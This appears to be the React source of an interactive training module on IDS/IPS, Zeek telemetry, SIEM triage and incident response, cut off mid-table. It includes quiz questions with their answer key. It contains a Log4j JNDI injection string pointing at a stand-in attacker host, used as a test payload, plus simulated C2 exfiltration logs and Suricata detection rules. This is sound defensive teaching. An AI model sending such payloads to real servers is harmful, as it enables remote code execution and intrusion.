import React, { useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Lock,
  Terminal,
  Activity,
  ArrowRight,
  ArrowLeft,
  RefreshCw,
  Play,
  Sliders,
  CheckCircle2,
  Copy,
  Check,
  FileText,
  HelpCircle,
  Network,
  Layers,
  Server,
  Globe,
  Cpu,
  Radio,
  Eye,
  Zap,
  Flame,
  Bug,
  Key,
  Database,
  Search,
  Filter,
  BarChart2,
  Bell,
  Clock,
  ListFilter,
  CheckSquare,
} from "lucide-react";
import ModuleNav from "./ModuleNav";

export default function NetworkIdsIpsSoc() {
  const navigate = useNavigate();

  // Active navigation tab: curriculum | simulators | lab | quiz | audit
  const [activeTab, setActiveTab] = useState("curriculum");

  // Lab checklist state (0/9)
  const [checkedItems, setCheckedItems] = useState({});
  const toggleCheck = (idx) => {
    setCheckedItems((prev) => ({ ...prev, [idx]: !prev[idx] }));
  };

  // Clipboard copy helper
  const [copiedKey, setCopiedKey] = useState(null);
  const handleCopy = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // ==========================================
  // SIMULATOR 1: Inline IPS vs. Passive IDS Interception Sandbox
  // ==========================================
  const [sensorDeployment, setSensorDeployment] = useState("passive"); // passive | inline
  const [bypassMode, setBypassMode] = useState("normal"); // normal | fail-open | fail-closed
  const [trafficPayload, setTrafficPayload] = useState("clean-web"); // clean-web | port-scan | log4j | sqli
  const [simRunResult, setSimRunResult] = useState(null);

  const runInterceptionSimulation = () => {
    const isMalicious = trafficPayload === "log4j" || trafficPayload === "sqli";
    const isSuspicious = trafficPayload === "port-scan";

    if (sensorDeployment === "passive") {
      // Passive TAP/SPAN: Traffic ALWAYS reaches destination; IDS produces alert if malicious
      setSimRunResult({
        deployment: "Passive IDS (SPAN / Mirror Port)",
        trafficStatus: "Delivered to Destination Server",
        trafficColor: "emerald",
        sensorAction: isMalicious || isSuspicious ? "ALERT GENERATED (eve.json)" : "PASS (No Match)",
        alertColor: isMalicious ? "rose" : isSuspicious ? "amber" : "stone",
        explanation: isMalicious
          ? "CRITICAL: Malicious payload was delivered to the protected web server! Passive IDS logged an alert in eve.json, but could not block the packet because it only inspects an out-of-band mirrored copy."
          : isSuspicious
          ? "WARNING: Port scan probe reached destination. Passive IDS generated a threshold notice."
          : "Clean traffic delivered normally. Passive IDS logged standard connection telemetry.",
        rawEvent: isMalicious
          ? `{"timestamp":"2026-10-15T14:22:01.402Z","event_type":"alert","src_ip":"198.51.100.45","src_port":44120,"dest_ip":"10.0.1.10","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2034001,"rev":1,"signature":"ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)","category":"Attempted Administrator Privilege Gain","severity":1}}`
          : null,
      });
    } else {
      // Inline IPS
      if (bypassMode === "fail-open") {
        setSimRunResult({
          deployment: "Inline IPS (Fail-Open Bypass Active)",
          trafficStatus: "Delivered (Bypassed Inspection)",
          trafficColor: "amber",
          sensorAction: "BYPASS (Zero Inspection)",
          alertColor: "amber",
          explanation:
            "HARDWARE BYPASS ACTIVE: The inline sensor relay is open (due to simulated system maintenance or overload). All traffic traversed the copper bypass uninspected. Exploits reach destination to guarantee link availability.",
          rawEvent: null,
        });
      } else if (bypassMode === "fail-closed") {
        setSimRunResult({
          deployment: "Inline IPS (Fail-Closed Relay Active)",
          trafficStatus: "DROPPED ALL (Link Severed)",
          trafficColor: "rose",
          sensorAction: "PHYSICAL DISCONNECT",
          alertColor: "rose",
          explanation:
            "FAIL-CLOSED ENGAGED: The inline sensor encountered a kernel panic and opened all relays. All traffic (both clean and malicious) is completely dropped. Security preserved, but service is offline.",
          rawEvent: null,
        });
      } else {
        // Normal inline inspection
        if (isMalicious) {
          setSimRunResult({
            deployment: "Inline IPS (Active Protection)",
            trafficStatus: "PACKET DROPPED BY IPS ENGINE",
            trafficColor: "rose",
            sensorAction: "DROP & REJECT (Rule SID 2034001)",
            alertColor: "emerald",
            explanation:
              "PREVENTION SUCCESS: Inline IPS evaluated protocol decoding and matched signature before forwarding. The exploit packet was dropped in the hardware buffer; the destination server never received the attack payload.",
            rawEvent: `{"timestamp":"2026-10-15T14:22:01.402Z","event_type":"alert","src_ip":"198.51.100.45","src_port":44120,"dest_ip":"10.0.1.10","dest_port":80,"proto":"TCP","alert":{"action":"blocked","gid":1,"signature_id":2034001,"rev":1,"signature":"ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)","category":"Attempted Administrator Privilege Gain","severity":1}}`,
          });
        } else if (isSuspicious) {
          setSimRunResult({
            deployment: "Inline IPS (Active Protection)",
            trafficStatus: "Connection Reset (TCP RST Sent)",
            trafficColor: "amber",
            sensorAction: "REJECT (Threshold Exceeded)",
            alertColor: "amber",
            explanation:
              "RECONNAISSANCE MITIGATED: Inline IPS detected unauthorized port scanning rate limit violation and transmitted bidirectional TCP RST packets, aborting the scanner.",
            rawEvent: null,
          });
        } else {
          setSimRunResult({
            deployment: "Inline IPS (Active Protection)",
            trafficStatus: "Forwarded to Server Cleanly",
            trafficColor: "emerald",
            sensorAction: "PASS (Clean Flow)",
            alertColor: "stone",
            explanation:
              "Clean traffic inspected at sub-millisecond line rate and passed transparently to the backend application.",
            rawEvent: null,
          });
        }
      }
    }
  };

  // ==========================================
  // SIMULATOR 2: Suricata & Snort 3 Rule Builder & Regex Matcher
  // ==========================================
  const [ruleAction, setRuleAction] = useState("alert"); // alert | drop | pass
  const [ruleProto, setRuleProto] = useState("http"); // http | tcp | dns
  const [ruleContent, setRuleContent] = useState("jndi:ldap");
  const [ruleNocase, setRuleNocase] = useState(true);
  const [ruleMsg, setRuleMsg] = useState("EXPLOIT Apache Log4j JNDI Lookup Attempt");
  const [ruleSid, setRuleSid] = useState(1000001);
  const [testPayloadText, setTestPayloadText] = useState("${jndi:ldap://198.51.100.99:1389/Exploit}");

  const ruleCode = useMemo(() => {
    return `${ruleAction} ${ruleProto} $EXTERNAL_NET any -> $HOME_NET any ( msg:"${ruleMsg}"; flow:to_server,established; content:"${ruleContent}";${
      ruleNocase ? " nocase;" : ""
    } classtype:attempted-admin; sid:${ruleSid}; rev:1; )`;
  }, [ruleAction, ruleProto, ruleMsg, ruleContent, ruleNocase, ruleSid]);

  const ruleMatchEvaluation = useMemo(() => {
    if (!ruleContent.trim()) return { matched: false, reason: "Content condition empty" };
    const haystack = ruleNocase ? testPayloadText.toLowerCase() : testPayloadText;
    const needle = ruleNocase ? ruleContent.toLowerCase() : ruleContent;
    const isMatch = haystack.includes(needle);

    return {
      matched: isMatch,
      actionTaken: isMatch ? (ruleAction === "drop" ? "PACKET BLOCKED (DROP)" : "ALERT GENERATED") : "NO MATCH (TRAFFIC PASSED)",
      color: isMatch ? (ruleAction === "drop" ? "rose" : "amber") : "stone",
      reason: isMatch
        ? `Fast-pattern match found substring "${ruleContent}" in payload stream.`
        : `Substring "${ruleContent}" not found in current test payload.`,
    };
  }, [ruleAction, ruleContent, ruleNocase, testPayloadText]);

  // ==========================================
  // SIMULATOR 3: Zeek Network Telemetry & Multi-Log Correlation Pivot
  // ==========================================
  const [zeekFilterUid, setZeekFilterUid] = useState("ALL"); // ALL | C6p0m21xZf9 | Cy8kP34bRt2 | Cw1nL88aQq9

  const zeekConnRecords = [
    {
      uid: "C6p0m21xZf9",
      ts: "14:15:02.110",
      orig_h: "10.0.1.45",
      orig_p: 52140,
      resp_h: "198.51.100.88",
      resp_p: 80,
      proto: "tcp",
      service: "http",
      duration: "0.24",
      orig_bytes: 480,
      resp_bytes: 1840,
      conn_state: "SF", // Normal SYN-FIN
      note: "Initial Exploit Staging Request",
    },
    {
      uid: "Cy8kP34bRt2",
      ts: "14:15:08.450",
      orig_h: "10.0.1.45",
      orig_p: 52144,
      resp_h: "203.0.113.15",
      resp_p: 53,
      proto: "udp",
      service: "dns",
      duration: "0.02",
      orig_bytes: 68,
      resp_bytes: 184,
      conn_state: "SF",
      note: "DNS Lookup for C2 Hostname",
    },
    {
      uid: "Cw1nL88aQq9",
      ts: "14:15:10.002",
      orig_h: "10.0.1.45",
      orig_p: 52150,
      resp_h: "198.51.100.99",
      resp_p: 4444,
      proto: "tcp",
      service: "unknown",
      duration: "1840.12",
      orig_bytes: 14200000,
      resp_bytes: 84000,
      conn_state: "SF",
      note: "LONG DURATION C2 EXFILTRATION CHANNEL (14.2 MB OUTBOUND)",
    },
  ];

  const zeekDnsRecords = [
    {
      uid: "Cy8kP34bRt2",
      ts: "14:15:08.450",
      query: "c2-exfil-node04.attacker-network.net",
      qtype_name: "A",
      answers: "198.51.100.99",
      rcode_name: "NOERROR",
    },
  ];

  const zeekHttpRecords = [
    {
      uid: "C6p0m21xZf9",
      ts: "14:15:02.120",
      method: "POST",
      host: "api.company.internal",
      uri: "/v1/auth/login",
      status_code: 200,
      user_agent: "curl/7.68.0",
      request_body_snippet: '{"user":"admin","token":"${jndi:ldap://198.51.100.88/a}"}',
    },
  ];

  const filteredConn = useMemo(() => {
    if (zeekFilterUid === "ALL") return zeekConnRecords;
    return zeekConnRecords.filter((r) => r.uid === zeekFilterUid);
  }, [zeekFilterUid]);

  const filteredDns = useMemo(() => {
    if (zeekFilterUid === "ALL") return zeekDnsRecords;
    return zeekDnsRecords.filter((r) => r.uid === zeekFilterUid);
  }, [zeekFilterUid]);

  const filteredHttp = useMemo(() => {
    if (zeekFilterUid === "ALL") return zeekHttpRecords;
    return zeekHttpRecords.filter((r) => r.uid === zeekFilterUid);
  }, [zeekFilterUid]);

  // ==========================================
  // SIMULATOR 4: SIEM Alert Triage & Incident Escalation Engine
  // ==========================================
  const [triageAlerts, setTriageAlerts] = useState([
    {
      id: "AL-101",
      title: "Suricata: SSH Brute Force Rate Limit Triggered",
      src: "198.51.100.12",
      dst: "10.0.1.5 (Public Bastion)",
      assetTier: "Tier 1: Critical Ingress",
      severity: "High",
      confidence: "High (50 failed auths in 30s)",
      status: "Unreviewed",
      disposition: null,
    },
    {
      id: "AL-102",
      title: "Zeek: High Volume Outbound TLS to Dynamic DNS Host",
      src: "10.0.5.88 (Executive Laptop)",
      dst: "203.0.113.200 (duckdns.org)",
      assetTier: "Tier 2: Sensitive Endpoint",
      severity: "Critical",
      confidence: "Medium (1.8 GB outbound session)",
      status: "Unreviewed",
      disposition: null,
    },
    {
      id: "AL-103",
      title: "Snort: Internal Vulnerability Scanner Probing SQL Ports",
      src: "10.0.99.10 (SecOps Scanner)",
      dst: "10.0.2.0/24 (Database Cluster)",
      assetTier: "Tier 1: Primary Database",
      severity: "High",
      confidence: "High (Known Scanner MAC)",
      status: "Unreviewed",
      disposition: null,
    },
  ]);

  const handleTriageAction = (alertId, actionName) => {
    setTriageAlerts((prev) =>
      prev.map((al) => {
        if (al.id === alertId) {
          return {
            ...al,
            status: "Resolved",
            disposition: actionName,
          };
        }
        return al;
      })
    );
  };

  const resetTriageQueue = () => {
    setTriageAlerts((prev) =>
      prev.map((al) => ({
        ...al,
        status: "Unreviewed",
        disposition: null,
      }))
    );
  };

  // ==========================================
  // SIMULATOR 5: Detection Quality & Confusion Matrix Calculator
  // ==========================================
  const [maliciousEvents, setMaliciousEvents] = useState(100);
  const [benignEvents, setBenignEvents] = useState(2000);
  const [detectionSensitivity, setDetectionSensitivity] = useState(85); // 0-100%

  const qualityMetrics = useMemo(() => {
    // As sensitivity rises: Recall increases, but False Positives also rise
    const recallFraction = detectionSensitivity / 100;
    const tp = Math.round(maliciousEvents * recallFraction);
    const fn = maliciousEvents - tp;

    // False positive rate grows non-linearly with sensitivity
    const fprRate = Math.pow(detectionSensitivity / 100, 3) * 0.05;
    const fp = Math.round(benignEvents * fprRate);
    const tn = benignEvents - fp;

    const precision = tp + fp > 0 ? (tp / (tp + fp)) * 100 : 0;
    const recall = tp + fn > 0 ? (tp / (tp + fn)) * 100 : 0;
    const fpr = fp + tn > 0 ? (fp / (fp + tn)) * 100 : 0;
    const f1 = precision + recall > 0 ? (2 * (precision * recall)) / (precision + recall) : 0;

    const dailyAlertVolume = tp + fp;
    let fatigueStatus = "Manageable (High Quality)";
    let fatigueColor = "emerald";

    if (dailyAlertVolume > 150) {
      fatigueStatus = "CRITICAL FATIGUE: High risk of missed incidents due to alert overload!";
      fatigueColor = "rose";
    } else if (dailyAlertVolume > 50) {
      fatigueStatus = "Moderate Burden: Rule tuning recommended.";
      fatigueColor = "amber";
    }

    return {
      tp,
      fp,
      fn,
      tn,
      precision: precision.toFixed(1),
      recall: recall.toFixed(1),
      fpr: fpr.toFixed(2),
      f1: f1.toFixed(1),
      dailyAlertVolume,
      fatigueStatus,
      fatigueColor,
    };
  }, [maliciousEvents, benignEvents, detectionSensitivity]);

  // ==========================================
  // QUIZ STATE (10 Questions)
  // ==========================================
  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);

  const quizQuestions = [
    {
      id: 1,
      question: "What is the primary architectural difference between a passive IDS and an inline IPS?",
      options: [
        "An IDS always encrypts traffic, while an IPS decrypts it",
        "An inline IPS sits directly in the packet forwarding path and can actively block matching traffic, while a passive IDS inspects a mirrored TAP/SPAN copy and only alerts",
        "An IDS cannot analyze TCP traffic; an IPS only analyzes UDP",
        "An IPS never produces alert logs, it only silently drops packets",
      ],
      correct: 1,
      explanation:
        "A passive IDS receives an out-of-band mirrored copy of traffic (via TAP or SPAN port) and can generate alerts without affecting packet forwarding. An inline IPS sits directly in the physical traffic path (bump-in-the-wire) and can actively drop, reset, or reject malicious packets at line rate.",
    },
    {
      id: 2,
      question: "Which detection strategy is most directly based on matching known traffic byte patterns or protocol sequences?",
      options: [
        "Signature-based detection",
        "Anomaly-based detection",
        "Capacity planning",
        "Asset inventory",
      ],
      correct: 0,
      explanation:
        "Signature-based detection matches traffic against specific known patterns, such as regular expressions, byte offsets, or protocol command sequences (e.g. Suricata/Snort rules).",
    },
    {
      id: 3,
      question: "What is the primary role of Zeek in modern enterprise network security monitoring?",
      options: [
        "Replacing all endpoint antivirus agents",
        "Translating observed wire packets into structured, behavioral protocol and connection logs (e.g. conn.log, dns.log, http.log)",
        "Guaranteeing that every single alert is confirmed malicious",
        "Automatically patching zero-day vulnerabilities in Linux servers",
      ],
      correct: 1,
      explanation:
        "Zeek is not a signature alert engine; it is a powerful network analysis framework that decodes network traffic and writes compact, structured transaction logs (conn.log, dns.log, ssl.log, etc.) ideal for forensics, threat hunting, and event correlation.",
    },
    {
      id: 4,
      question: "An analyst discovers an IDS alert and a suspicious DNS query appearing close together in time. What should the analyst do?",
      options: [
        "Immediately declare a confirmed compromise and format the machine",
        "Ignore both events as coincidental network noise",
        "Correlate endpoint IP, timestamps, destination addresses, and Zeek connection records before reaching a conclusion",
        "Delete the packet capture file to preserve disk space",
      ],
      correct: 2,
      explanation:
        "Correlation is not causation. Analysts must cross-reference timestamps, endpoint IPs, resolved DNS answers, and subsequent connection flows in conn.log before declaring an incident or taking disruptive containment actions.",
    },
    {
      id: 5,
      question: "What does high precision (e.g., 95%) mean in detection quality engineering?",
      options: [
        "A large fraction of generated positive detections (alerts) are genuine true positives, resulting in low false alarm noise",
        "Every single malicious event across the entire network was successfully caught",
        "The network sensor did not drop any packets from the ring buffer",
        "The false negative rate is guaranteed to be 0%",
      ],
      correct: 0,
      explanation:
        "Precision = TP / (TP + FP). High precision means that when an alert fires, it is overwhelmingly likely to be genuine malicious activity rather than a false positive.",
    },
    {
      id: 6,
      question: "What essential operational procedure must occur before deploying an IPS rule in inline blocking mode in production?",
      options: [
        "Assume every match is malicious without testing",
        "Test the rule in alert-only mode against benign baseline traffic, evaluate false positive rates, and obtain change approval",
        "Delete all existing enterprise firewall rules",
        "Disable all network monitoring to reduce latency",
      ],
      correct: 1,
      explanation:
        "An incorrectly configured inline blocking rule can cause severe business outages by dropping legitimate customer or service traffic. Rules must be vetted in passive/alert mode first and reviewed for false positive potential.",
    },
    {
      id: 7,
      question: "What is an established best practice during the incident response containment phase (NIST SP 800-61)?",
      options: [
        "Modify the only original copy of the evidence during live triage",
        "Record a verifiable timeline, preserve raw PCAP and log evidence, document containment actions, and validate recovery",
        "Contain every minor alert by shutting down the entire corporate data center",
        "Close incidents without documenting the rationale or root cause",
      ],
      correct: 1,
      explanation:
        "Professional incident response requires maintaining chain of custody, documenting actions, recording a chronological timeline, and applying measured, proportionate containment (e.g. isolating an endpoint) without destroying volatile evidence.",
    },
    {
      id: 8,
      question: "In Zeek's conn.log, what does a connection state of 'S0' indicate?",
      options: [
        "Connection successfully established and gracefully terminated (SYN, SYN-ACK, ACK, FIN)",
        "Connection attempt seen (SYN sent), but no reply was ever observed from the responder",
        "Connection was actively rejected by the target with a TCP RST",
        "Connection was upgraded to TLS 1.3",
      ],
      correct: 1,
      explanation:
        "In Zeek conn.log, 'S0' signifies that the originator transmitted a SYN packet, but the sensor observed zero response from the destination. This pattern is characteristic of port scans, firewall packet drops, or unreachable hosts.",
    },
    {
      id: 9,
      question: "In a Suricata or Snort rule, what is the role of the 'flow:established,to_server' option?",
      options: [
        "It limits rule evaluation to established TCP sessions flowing in the direction of the server, preventing false alarms on spoofed or incomplete handshakes",
        "It forces the router to prioritize traffic using BGP flowspec",
        "It encrypts the payload using TLS 1.3",
        "It automatically drops all UDP packets on port 53",
      ],
      correct: 0,
      explanation:
        "The flow keyword leverages the engine's stateful TCP reassembly. Requiring 'established,to_server' ensures the full 3-way handshake succeeded before evaluating payload signatures, eliminating noise from unacknowledged SYN floods or port probes.",
    },
    {
      id: 10,
      question: "What is the primary benefit of the 'Aho-Corasick' algorithm in modern multi-pattern IDS engines like Suricata and Snort 3?",
      options: [
        "It decrypts HTTPS traffic without private keys",
        "It matches tens of thousands of signature content strings simultaneously in a single pass over the packet payload, preventing linear performance degradation",
        "It dynamically reconfigures switch VLAN tags",
        "It automatically translates IPv4 packets into IPv6",
      ],
      correct: 1,
      explanation:
        "Aho-Corasick is a multi-pattern search automaton that allows IDS engines to inspect a payload once against thousands of rule fast-patterns in O(n) time, enabling 40Gbps+ line-rate inspection.",
    },
  ];

  const handleQuizSelect = (qId, optionIdx) => {
    if (quizSubmitted) return;
    setQuizAnswers((prev) => ({ ...prev, [qId]: optionIdx }));
  };

  const calculateScore = () => {
    let score = 0;
    quizQuestions.forEach((q) => {
      if (quizAnswers[q.id] === q.correct) score++;
    });
    return score;
  };

  const resetQuiz = () => {
    setQuizAnswers({});
    setQuizSubmitted(false);
  };

  // Copyable Markdown Deliverable Template
  const socIncidentReport = `# SOC INCIDENT ASSESSMENT & DETECTION ENGINEERING AUDIT
**Case Reference:** SOC-IR-2026-PCAP-105
**Lead Security Analyst:** Senior SOC Analyst & Detection Engineer
**Incident Classification:** Severity-1 Unauthorized Lateral Movement & Command-and-Control (C2)
**Date / Time (UTC):** 2026-10-15 14:30:00 UTC
**Investigation Scope:** Corporate Campus DMZ & Workstation Subnet (VLAN 10, 10.0.1.0/24)

---

## 1. EXECUTIVE SUMMARY
On 2026-10-15 at 14:15 UTC, the Security Operations Center (SOC) detected high-confidence alerts from Suricata sensor NSM-01 matching Apache Log4j RCE exploitation attempts against internal web service **10.0.1.10**. Cross-log correlation in Zeek telemetry confirmed that following the exploit request, workstation **10.0.1.45** resolved dynamic DNS domain \`c2-exfil-node04.attacker-network.net\` and initiated an unauthorized, 30-minute persistent outbound TCP channel on port 4444 (14.2 MB exfiltrated).

Immediate host isolation was executed via switchport 802.1X quarantine. Eradication and forensic memory acquisition are ongoing.

---

## 2. SURICATA DETECTION RULES VALIDATION

### Custom Detection Rule 1 (Exploit Detection)
\`\`\`suricata
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"ET EXPLOIT Apache Log4j JNDI Lookup Ingress (CVE-2021-44228)";
    flow:established,to_server;
    content:"jndi:ldap"; nocase;
    classtype:attempted-admin;
    sid:1000021; rev:1;
)
\`\`\`
- **Test Result:** Successfully matched on test PCAP frame #142 (Payload: \`POST /v1/auth/login\`).
- **False Positive Test:** Executed against 10,000 benign baseline web requests; 0 false alarms.

### Custom Detection Rule 2 (C2 Callback Detection)
\`\`\`suricata
alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (
    msg:"MALWARE Suspicious Outbound Interactive Shell Port 4444";
    flow:established,to_server;
    threshold:type limit, track by_src, count 1, seconds 300;
    classtype:trojan-activity;
    sid:1000022; rev:1;
)
\`\`\`
- **Test Result:** Alerted on Zeek connection UID \`Cw1nL88aQq9\`.

---

## 3. ZEEK TELEMETRY & MULTI-SOURCE TIMELINE RECONSTRUCTION

| Timestamp (UTC) | Source Sensor | Event Record Details | Analytical Finding |
| :--- | :--- | :--- | :--- |
| **14:15:02.120** | Zeek http.log | UID: \`C6p0m21xZf9\` \| 10.0.1.45 -> 198.51.100.88:80 \| POST /v1/auth/login | Ingress payload contained JNDI LDAP string. |
| **14:15:08.450** | Zeek dns.log | UID: \`Cy8kP34bRt2\` \| Query: \`c2-exfil-node04.attacker-network.net\` -> \`198.51.100.99\` | Compromised endpoint queried external dynamic DNS. |
| **14:15:10.002** | Zeek conn.log | UID: \`Cw1nL88aQq9\` \| 10.0.1.45:52150 -> 198.51.100.99:4444 \| Duration: 1840s | Outbound TCP established (\`SF\`); 14.2 MB transmitted. |
| **14:16:30.000** | SIEM Ingestion | Correlated AL-101 and AL-102 into P1 Incident Ticket | Analyst assigned; containment protocol initiated. |

---

## 4. DETECTION QUALITY & CONFUSION MATRIX METRICS

- **Dataset Evaluated:** 100 Malicious Test Samples, 2,000 Benign Baseline Samples.
- **True Positives (TP):** 92
- **False Positives (FP):** 8
- **False Negatives (FN):** 8
- **True Negatives (TN):** 1,992
- **Precision:** 92.0% (\`TP / (TP + FP)\`)
- **Recall:** 92.0% (\`TP / (TP + FN)\`)
- **False Positive Rate (FPR):** 0.40% (\`FP / (FP + TN)\`)
- **F1-Score:** 92.0%

---

## 5. INCIDENT CONTAINMENT & SRE REMEDIATION ACTIONS
1. **Network Containment:** Endpoint 10.0.1.45 isolated to Quarantine VLAN 999 via Cisco ISE CoA (Change of Authorization).
2. **Perimeter Firewall Shun:** Destination IP \`198.51.100.99\` and domain \`*.attacker-network.net\` blocked on edge Palo Alto firewalls.
3. **Log4j Patch Deployment:** Vulnerable server 10.0.1.10 upgraded to Log4j 2.17.1; JVM parameter \`-Dlog4j2.formatMsgNoLookups=true\` enforced.
4. **Post-Incident Review:** Scheduled for 2026-10-18 to evaluate SIEM rule threshold tuning.
`;

  return (
    <div className="min-h-screen bg-[#f6f4ee] text-stone-900 font-sans">
      <ModuleNav
        track="networks"
        currentModuleId="ids-ips-soc"
        showAiTutor={false}
      />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Breadcrumb Header */}
        <div className="flex items-center gap-2 text-xs font-mono text-stone-700 mb-4">
          <span>COMPUTER NETWORKS &amp; INTERNET ENGINEERING</span>
          <span>/</span>
          <span>MODULE 20</span>
          <span>/</span>
          <span className="text-[#ea580c] font-bold">IDS/IPS, SOC MONITORING &amp; INCIDENT RESPONSE</span>
        </div>

        {/* Title Card */}
        <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm mb-8">
          <div className="flex flex-wrap items-center justify-between gap-4 mb-4">
            <div className="flex items-center gap-2">
              <span className="px-3 py-1 rounded-full text-xs font-bold bg-rose-100 text-rose-800 border border-rose-200 flex items-center gap-1.5">
                <ShieldAlert size={14} />
                Security Operations &amp; Threat Detection
              </span>
              <span className="px-3 py-1 rounded-full text-xs font-bold bg-orange-100 text-[#ea580c] border border-orange-200">
                Suricata · Snort 3 · Zeek · SIEM
              </span>
              <span className="px-3 py-1 rounded-full text-xs font-bold bg-stone-100 text-stone-700 border border-stone-200">
                NIST SP 800-61 Rev 3
              </span>
            </div>
            <div className="flex items-center gap-3 text-xs font-mono text-stone-700">
              <span>Level: Intermediate to Advanced</span>
            </div>
          </div>

          <h1 className="text-3xl sm:text-4xl font-extrabold text-stone-900 tracking-tight mb-3">
            IDS/IPS, SOC Monitoring and Incident Response
          </h1>
          <p className="text-stone-700 text-base sm:text-lg leading-relaxed max-w-4xl">
            Modern network defense is not just about blocking suspicious traffic. Security operations teams must collect rich wire-level telemetry, author testable detection signatures, reconstruct connection flows using Zeek, correlate multi-source indicators of compromise (IoCs), triage alerts without operational fatigue, and execute defensible incident response runbooks.
          </p>

          {/* Navigation Tabs */}
          <div className="flex flex-wrap items-center gap-2 mt-6 pt-6 border-t border-stone-100">
            <button
              onClick={() => setActiveTab("curriculum")}
              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                activeTab === "curriculum"
                  ? "bg-[#ea580c] text-white shadow-sm"
                  : "bg-stone-100 text-stone-600 hover:bg-stone-200"
              }`}
            >
              <FileText size={15} />
              <span>1. Complete Curriculum (20.1–20.10)</span>
            </button>
            <button
              onClick={() => setActiveTab("simulators")}
              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                activeTab === "simulators"
                  ? "bg-[#ea580c] text-white shadow-sm"
                  : "bg-stone-100 text-stone-600 hover:bg-stone-200"
              }`}
            >
              <Activity size={15} />
              <span>2. Interactive Sandboxes (5 Engines)</span>
            </button>
            <button
              onClick={() => setActiveTab("lab")}
              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                activeTab === "lab"
                  ? "bg-[#ea580c] text-white shadow-sm"
                  : "bg-stone-100 text-stone-600 hover:bg-stone-200"
              }`}
            >
              <Terminal size={15} />
              <span>3. Hands-On Lab 20.1 (Checklist 0/9)</span>
            </button>
            <button
              onClick={() => setActiveTab("quiz")}
              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                activeTab === "quiz"
                  ? "bg-[#ea580c] text-white shadow-sm"
                  : "bg-stone-100 text-stone-600 hover:bg-stone-200"
              }`}
            >
              <HelpCircle size={15} />
              <span>4. Knowledge Check (10 Questions)</span>
            </button>
            <button
              onClick={() => setActiveTab("audit")}
              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                activeTab === "audit"
                  ? "bg-[#ea580c] text-white shadow-sm"
                  : "bg-stone-100 text-stone-600 hover:bg-stone-200"
              }`}
            >
              <ShieldCheck size={15} />
              <span>5. SRE Incident Assessment Deliverable</span>
            </button>
          </div>
        </div>

        {/* TAB 1: CURRICULUM */}
        {activeTab === "curriculum" && (
          <div className="space-y-8">
            {/* 20.1 IDS vs IPS */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.1
                </span>
                <span className="text-xs font-semibold text-stone-700">Architectural Topologies</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.1 IDS vs. IPS: Architectural Topologies and Failure Modes
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                An <strong>Intrusion Detection System (IDS)</strong> and an <strong>Intrusion Prevention System (IPS)</strong> can run the exact same underlying detection engine (e.g. Suricata or Snort 3). What distinguishes them is their <em>physical and logical network placement</em> and the configured rule actions:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5 my-6">
                <div className="p-5 rounded-2xl border border-stone-200 bg-[#f6f4ee]">
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="font-bold text-stone-900 text-sm">Pattern A: Passive IDS (Out-of-Band)</h4>
                    <span className="text-[10px] font-mono bg-blue-100 text-blue-800 px-2 py-0.5 rounded font-bold">TAP / SPAN</span>
                  </div>
                  <p className="text-xs text-stone-600 leading-relaxed mb-3">
                    The sensor connects to a switch SPAN (mirror) port or optical network TAP. It analyzes a <em>duplicate copy</em> of live traffic.
                  </p>
                  <ul className="text-xs text-stone-700 space-y-1.5 list-disc pl-4">
                    <li><strong>Advantage:</strong> Zero latency added to live production flows. A sensor crash or buffer overload never interrupts traffic.</li>
                    <li><strong>Limitation:</strong> Cannot block packets in-flight. At best, it can emit a reactive TCP RST packet (often arriving after the exploit payload has executed).</li>
                  </ul>
                </div>

                <div className="p-5 rounded-2xl border border-stone-200 bg-[#f6f4ee]">
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="font-bold text-stone-900 text-sm">Pattern B: Inline IPS (Bump-in-the-Wire)</h4>
                    <span className="text-[10px] font-mono bg-rose-100 text-rose-800 px-2 py-0.5 rounded font-bold">Inline Bridge</span>
                  </div>
                  <p className="text-xs text-stone-600 leading-relaxed mb-3">
                    The device sits directly in the forwarding path between routers and core switches. Packets physically enter one NIC and exit another.
                  </p>
                  <ul className="text-xs text-stone-700 space-y-1.5 list-disc pl-4">
                    <li><strong>Advantage:</strong> Can evaluate rules and execute <code>drop</code> or <code>reject</code> actions, dropping the exploit packet before it reaches the target server.</li>
                    <li><strong>Main Operational Risk:</strong> False positive rules block legitimate customer traffic. Sensor hardware failure severs the link unless protected by an optical/copper hardware bypass switch (Fail-Open vs Fail-Closed).</li>
                  </ul>
                </div>
              </div>

              <div className="overflow-x-auto my-4">
                <table className="w-full text-xs text-left border border-stone-200 rounded-xl overflow-hidden">
                  <thead className="bg-stone-100 text-stone-800 font-mono">
                    <tr>
                      <th className="p-3">Feature</th>
                      <th className="p-3">Passive IDS</th>
                      <th className="p-3">Inline IPS</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-stone-200 text-stone-700">
                    <tr>
                      <td className="p-3 font-semibold">Primary Purpose</td>
